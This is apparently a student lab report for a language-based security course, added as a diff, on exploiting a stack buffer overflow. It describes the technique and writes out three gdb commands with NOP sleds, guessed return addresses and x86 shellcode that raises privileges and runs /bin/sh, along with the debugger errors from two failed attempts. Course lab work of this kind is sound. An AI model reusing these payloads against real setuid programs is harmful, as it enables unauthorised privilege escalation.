@@ -1,0 +1,52 @@
+Report
+Course: TDA602 Language-based security
+Done by: Oleksii Prykhodko, Ruslan Masinjila
+
+//////////////////////////////////////////////
+Part 1: The exploit
+
+The idea behind buffer overflow in this lab is to exploit vulnerable function, which does not perform
+size check before writing input in a buffer. Knowing how stack functions and where is return address located
+is key part.
+
+The idea is to give the buffer big string, more than it's capasity and overwrite the return address. The overritten
+return adress, in turn, should point back on buffer, where a bunch of nop '\x90' is located. This should forward
+the program strait to the malicious code, which can be whatever hacker desires.
+
+Simple in theory, the attack may be hard to execute nowadays as it is well studied and well defended against in 
+all respected institutions.
+
+//////////////////////////////////////////////
+Part 2: Creating the exploit
+The key part is to find a return adress. This can be done with gbd. The buffer size is 256 in the programm, but for some reason it
+overflows at 408 bytes of input, and 407 runns without error. This may be because of x32 / x64 system or some other reason.
+
+We had a few variations of command to run. First one is 
+
+	run $(python -c 'print "\x90"*305 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x41\x41\x41\x41"*10') a b
+
+Which is logical, at my point of view: nop in the beggining, then code, where x41 is located will go return adress.
+after the execution one shell see segmantation fault. Then type 'backtrace' and if everything is right, one shell see somethig like
+'Can not access memory at address 0x41414141'. Then one shall type 'x/x200 $sp' and see, where are the nops located. Pick up any nop adreess and boom, everything shall work.
+
+But with this approach we were getting #6  0x90909090 in ?? () Cannot access memory at address 0x90909090 .
+Which hinted, that probably return address is located in the beginning.
+
+
+So, the second script was 
+
+	run $(python -c 'print "\x54\xfb\xff\xbf"*76 + "\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*41') a b
+
+Which correctly points at nop in the end, but the error is again
+
+#6  0xbffffb54 in ?? ()
+#7  0x90909090 in ?? ()
+Cannot access memory at address 0x90909090
+
+at this point we are left clules. Maybe you can give us some hints?
+
+
+It also should be mentioned, that with this approach we managed to hack the simpler programm, which is also comes with the report.
+The command used for this one is:
+
+	run $(python -c 'print "\x90" * 419 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42" + "\xb4\xfc\xff\xbf" * 10')
